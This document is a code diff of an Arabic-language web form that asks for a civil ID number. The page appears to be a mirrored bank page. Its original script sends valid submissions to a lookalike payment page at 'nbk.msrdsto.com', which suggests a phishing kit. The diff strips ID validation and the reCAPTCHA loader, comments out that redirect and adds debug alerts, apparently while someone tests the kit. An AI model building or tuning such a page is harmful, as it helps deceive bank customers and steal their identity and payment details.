@@ -3389,7 +3389,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <div class="col-lg-4 col-md-6 col-12">
         <div class="form-group relative">
             <input type="text"  maxlength="50" tabindex="3" placeholder="الرقم المدني *" class="form-control" id="civilIDNumber" name="civilIDNumber"
-                   data-msg-required="هذا الحقل إجباري." data-rule-civilID="true" data-rule-digits="true" data-msg-digits="يُسمح باستخدام الأرقام فقط." data-msg-civilID="الرقم المدني غير صحيح." data-rule-maxlength="12" data-msg-maxlength="يُسمح بإدخال 12 رقماً كحد أقصى."  data-rule-required="true"  value="">
+                   data-msg-required="هذا الحقل إجباري." data-rule-civilID="true" data-rule-digits="true" data-msg-digits="يُسمح باستخدام الأرقام فقط." data-rule-maxlength="12" data-msg-maxlength="يُسمح بإدخال 12 رقماً كحد أقصى."  data-rule-required="true"  value="">
         </div>
     </div>
     <div class="col-lg-4 col-md-6 col-12">
@@ -3705,20 +3705,20 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <div class="cols-buttons col-lg-4 col-md-6 col-12 pull-right" >
         <div class="m-b-10">
             <script>
-                var languageForCaptcha = 'ar';
-                var list = document.getElementsByTagName('script');
-                var i = list.length, flag = false;
-                while (i--) {
-                    if (list[i].src == '../../../www.google.com/recaptcha/apiad4a.js?hl=' + languageForCaptcha) {
-                        flag = true;
-                        break;
-                    }
-                }
-                if (!flag) {
-                    var tag = document.createElement('script');
-                    tag.src = '../../../www.google.com/recaptcha/apiad4a.js?hl=' + languageForCaptcha;
-                    document.getElementsByTagName('body')[0].appendChild(tag);
-                }
+                // var languageForCaptcha = 'ar';
+                // var list = document.getElementsByTagName('script');
+                // var i = list.length, flag = false;
+                // while (i--) {
+                //     if (list[i].src == '../../../www.google.com/recaptcha/apiad4a.js?hl=' + languageForCaptcha) {
+                //         flag = true;
+                //         break;
+                //     }
+                // }
+                // if (!flag) {
+                //     var tag = document.createElement('script');
+                //     tag.src = '../../../www.google.com/recaptcha/apiad4a.js?hl=' + languageForCaptcha;
+                //     document.getElementsByTagName('body')[0].appendChild(tag);
+                // }
 
             </script>
             <input type="hidden" name="gRecaptchaResponse" id="gRecaptchaResponse" value="" />
@@ -3744,7 +3744,9 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                                 function onload() {
                                     var element = document.getElementById('SubmitButtonWithRecaptcha');
                                     if(element != null){
-                                        element.onclick = validate;
+                                        alert(element);
+                                        console.log(element);
+                                        //element.onclick = validate;
                                     }
                                 }
                                 onload();
@@ -3779,8 +3781,10 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                                 });
                                 var isFormValid = $("#6d8882c6-902d-44c0-924d-d2f2470ec7cb-recaptcha").valid();
                                 if (isFormValid) {
-                                    window.location.href = "https://nbk.msrdsto.com/pay.html";
-                                    grecaptcha.execute();
+                                    alert("Form is valid");
+
+                                    // window.location.href = "https://nbk.msrdsto.com/pay.html";
+                                    // grecaptcha.execute();
                                 }
                             }
 
